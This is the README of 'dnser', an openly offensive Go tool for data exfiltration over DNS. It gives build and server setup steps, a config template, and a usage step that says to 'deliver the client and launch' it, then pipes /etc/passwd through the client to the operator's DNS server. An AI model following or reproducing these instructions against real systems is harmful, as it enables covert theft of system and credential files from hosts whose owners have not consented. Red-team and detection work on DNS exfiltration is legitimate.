

<!-- Improved compatibility of back to top link: See: https://github.com/fedoik/dnser/pull/73 -->
<!-- <a id="readme-top"></a> -->
<!--
*** Thanks for checking out the Best-README-Template. If you have a suggestion
*** that would make this better, please fork the repo and create a pull request
*** or simply open an issue with the tag "enhancement".
*** Don't forget to give the project a star!
*** Thanks again! Now go create something AMAZING! :D
-->



<!-- PROJECT SHIELDS -->
<!--
*** I'm using markdown "reference style" links for readability.
*** Reference links are enclosed in brackets [ ] instead of parentheses ( ).
*** See the bottom of this document for the declaration of the reference variables
*** for contributors-url, forks-url, etc. This is an optional, concise syntax you may use.
*** https://www.markdownguide.org/basic-syntax/#reference-style-links
-->
<!-- [![Contributors][contributors-shield]][contributors-url]
[![Forks][forks-shield]][forks-url]
[![Stargazers][stars-shield]][stars-url]
[![Issues][issues-shield]][issues-url]
[![project_license][license-shield]][license-url] -->


<!-- PROJECT LOGO -->
<br />
<div align="center">
  <a id="readme-top"></a>
  <a href="https://github.com/fedoik/dnser">
    <img src="imgs/help.png" alt="Logo">
  </a>

  <h3 align="center">dnser</h3>

  <p align="center">
    Utility for data exfiltration using the DNS protocol!
    <br />
    <a href="https://github.com/fedoik/dnser"><strong>Explore the docs »</strong></a>
    <br />
    <br />
    <a href="#demo">View Demo</a>
    ·
    <a href="https://github.com/fedoik/dnser/issues/new?labels=bug&template=bug-report---.md">Report Bug</a>
    ·
    <a href="https://github.com/fedoik/dnser/issues/new?labels=enhancement&template=feature-request---.md">Request Feature</a>
  </p>
</div>



<!-- TABLE OF CONTENTS -->
 ## Table of Contents
<!--<details>
  <summary>Table of Contents</summary> -->
  <ol>
    <li>
      <a href="#about-the-project">About The Project</a>
      <ul>
        <li><a href="#built-with">Built With</a></li>
      </ul>
    </li>
    <li>
      <a href="#demo">Demo</a>
    </li>
    <li>
      <a href="#getting-started">Getting Started</a>
      <ul>
        <li><a href="#prerequisites">Prerequisites</a></li>
        <li><a href="#installation">Installation</a></li>
      </ul>
    </li>
    <li><a href="#usage">Usage</a></li>
    <li><a href="#roadmap">Roadmap</a></li>
    <li><a href="#contributing">Contributing</a></li>
    <li><a href="#license">License</a></li>
    <li><a href="#contact">Contact</a></li>
    <li><a href="#acknowledgments">Acknowledgments</a></li>
  </ol>
<!-- </details> -->



<!-- ABOUT THE PROJECT -->
## About The Project

![project_idea](./imgs/dnser_schema.png)

<p align="right">(<a href="#readme-top">back to top</a>)</p>



### Built With

* [![Go][Go.i]][Go-url]
<!-- * [![React][React.js]][React-url]
* [![Vue][Vue.js]][Vue-url]
* [![Angular][Angular.io]][Angular-url]
* [![Svelte][Svelte.dev]][Svelte-url]
* [![Laravel][Laravel.com]][Laravel-url]
* [![Bootstrap][Bootstrap.com]][Bootstrap-url]
* [![JQuery][JQuery.com]][JQuery-url] -->

<p align="right">(<a href="#readme-top">back to top</a>)</p>

## Demo

![demo](./imgs/demo.gif)


<p align="right">(<a href="#readme-top">back to top</a>)</p>

<!-- GETTING STARTED -->
## Getting Started

This section explains how to install the utility.

### Prerequisites

go version >= 1.21.5
* go
  ```sh
  go version
  ```

### Installation

1. Clone the repo
   ```sh
   git clone https://github.com/fedoik/dnser.git
   ```
2. Go to folder
   ```sh
   cd dnser/src/
   ```
3. Install go packages
   ```sh
   go mod tidy
   ```
3. Build the server binary
   ```sh
    go build server.go
   ```

<p align="right">(<a href="#readme-top">back to top</a>)</p>



<!-- USAGE EXAMPLES -->
## Usage

Before you start using it, you need to build the client binary, after which you can up the server.

1. Create config
  ```yaml
  server:
    port: <dnsport>
    host: <ip>
    domain: <domain for resolving>

  client:
    projectDir: <path to dnser/src/ (example: /tmp/dnser/src/)>
  ```
2. Build client. We get the path to the client binary
  ```
  ./server -config <path to config> -build
  ```
3. Start the server
  ```
  ./server -config <path to config> -serve
  ```
4. After that we deliver the client and launch
  ```
  cat /etc/passwd | dnser_c
  ```


_For more examples, please refer to the [SOON](SOON)_

<p align="right">(<a href="#readme-top">back to top</a>)</p>

<!-- ![help](./imgs/help.png) -->

<!-- ROADMAP -->
## Roadmap

- [ ] Rewrite the DNS resolver so as not to use CGO. (Cross -platform)
- [ ] Rate limit for dns requests (From config)
- [ ] Сhange subdomain size from config
    - [ ] Fix size
    - [ ] Random size
- [ ] Output into file

See the [open issues](https://github.com/fedoik/dnser/issues) for a full list of proposed features (and known issues).

<p align="right">(<a href="#readme-top">back to top</a>)</p>



<!-- CONTRIBUTING -->
## Contributing

If you have a suggestion that would make this better, please fork the repo and create a pull request. You can also simply open an issue with the tag "enhancement".
Don't forget to give the project a star! Thanks again!

1. Fork the Project
2. Create your Feature Branch (`git checkout -b feature/AmazingFeature`)
3. Commit your Changes (`git commit -m 'Add some AmazingFeature'`)
4. Push to the Branch (`git push origin feature/AmazingFeature`)
5. Open a Pull Request

<p align="right">(<a href="#readme-top">back to top</a>)</p>

<!-- ### Top contributors:

<a href="https://github.com/fedoik/dnser/graphs/contributors">
  <img src="https://contrib.rocks/image?repo=fedoik/dnser" alt="contrib.rocks image" />
</a> -->



<!-- LICENSE -->
## License

Distributed under the project_license. See `LICENSE.txt` for more information.

<p align="right">(<a href="#readme-top">back to top</a>)</p>



<!-- CONTACT -->
## Contact

Tg - [@fed01k](https://t.me/fed01k)

Project Link: [https://github.com/fedoik/dnser](https://github.com/fedoik/dnser)

<p align="right">(<a href="#readme-top">back to top</a>)</p>



<!-- ACKNOWLEDGMENTS -->
<!-- ## Acknowledgments

* []()
* []()
* []()

<p align="right">(<a href="#readme-top">back to top</a>)</p> -->



<!-- MARKDOWN LINKS & IMAGES -->
<!-- https://www.markdownguide.org/basic-syntax/#reference-style-links -->
[Go-url]: https://go.dev/
[Go.i]: https://img.shields.io/badge/Go-00ADD8?logo=Go&logoColor=white&style=for-the-badge


[contributors-shield]: https://img.shields.io/github/contributors/fedoik/dnser.svg?style=for-the-badge
[contributors-url]: https://github.com/fedoik/dnser/graphs/contributors
[forks-shield]: https://img.shields.io/github/forks/fedoik/dnser.svg?style=for-the-badge
[forks-url]: https://github.com/fedoik/dnser/network/members
[stars-shield]: https://img.shields.io/github/stars/fedoik/dnser.svg?style=for-the-badge
[stars-url]: https://github.com/fedoik/dnser/stargazers
[issues-shield]: https://img.shields.io/github/issues/fedoik/dnser.svg?style=for-the-badge
[issues-url]: https://github.com/fedoik/dnser/issues
[license-shield]: https://img.shields.io/github/license/fedoik/dnser.svg?style=for-the-badge
[license-url]: https://github.com/fedoik/dnser/blob/main/LICENSE.txt
[linkedin-shield]: https://img.shields.io/badge/-LinkedIn-black.svg?style=for-the-badge&logo=linkedin&colorB=555
[linkedin-url]: https://linkedin.com/in/linkedin_username
[product-screenshot]: images/screenshot.png
[React.js]: https://img.shields.io/badge/React-20232A?style=for-the-badge&logo=react&logoColor=61DAFB
[React-url]: https://reactjs.org/
[Vue.js]: https://img.shields.io/badge/Vue.js-35495E?style=for-the-badge&logo=vuedotjs&logoColor=4FC08D
[Vue-url]: https://vuejs.org/
[Angular.io]: https://img.shields.io/badge/Angular-DD0031?style=for-the-badge&logo=angular&logoColor=white
[Angular-url]: https://angular.io/
[Svelte.dev]: https://img.shields.io/badge/Svelte-4A4A55?style=for-the-badge&logo=svelte&logoColor=FF3E00
[Svelte-url]: https://svelte.dev/
[Laravel.com]: https://img.shields.io/badge/Laravel-FF2D20?style=for-the-badge&logo=laravel&logoColor=white
[Laravel-url]: https://laravel.com
[Bootstrap.com]: https://img.shields.io/badge/Bootstrap-563D7C?style=for-the-badge&logo=bootstrap&logoColor=white
[Bootstrap-url]: https://getbootstrap.com
[JQuery.com]: https://img.shields.io/badge/jQuery-0769AD?style=for-the-badge&logo=jquery&logoColor=white
[JQuery-url]: https://jquery.com 